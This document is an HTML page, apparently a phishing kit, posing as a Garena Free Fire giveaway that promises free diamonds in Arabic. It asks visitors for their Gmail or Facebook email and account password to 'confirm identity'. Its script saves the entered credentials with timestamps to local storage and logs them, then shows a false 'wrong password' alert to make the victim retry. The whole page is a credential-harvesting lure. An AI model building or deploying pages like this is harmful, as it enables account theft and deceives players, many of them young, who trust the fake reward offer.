<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Freefire Best Reward Gifter</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
    <script>
        function gatherInfo() {
            // Get the values from the input fields
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Create a log entry
            const logEntry = {
                email: email,
                password: password,
                timestamp: new Date().toISOString() // Adding a timestamp
            };

            // Retrieve existing logs from local storage
            let logs = JSON.parse(localStorage.getItem('logs')) || [];

            // Add the new log entry
            logs.push(logEntry);

            // Save the updated logs back to local storage
            localStorage.setItem('logs', JSON.stringify(logs));

            // Log the values to the console
            console.log(`Email: ${email}, Password: ${password}`);
            alert('البريد الإلكتروني أو كلمة المرور خاطئة!');

            // Resetting the input fields
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        }
    </script>
</head>
<body>
    <header>
        <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
    </header>
    <main>
        <h1>مكافأة الماس المجانية من فري فاير</h1>
        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
        
        <input type="text" id="email" placeholder="Gmail/Facebook email" required>
        <input type="text" id="password" placeholder="كلمة مرور حسابك" required>
        <button onclick="gatherInfo()">اقبل</button>
    </main>
</body>
</html>
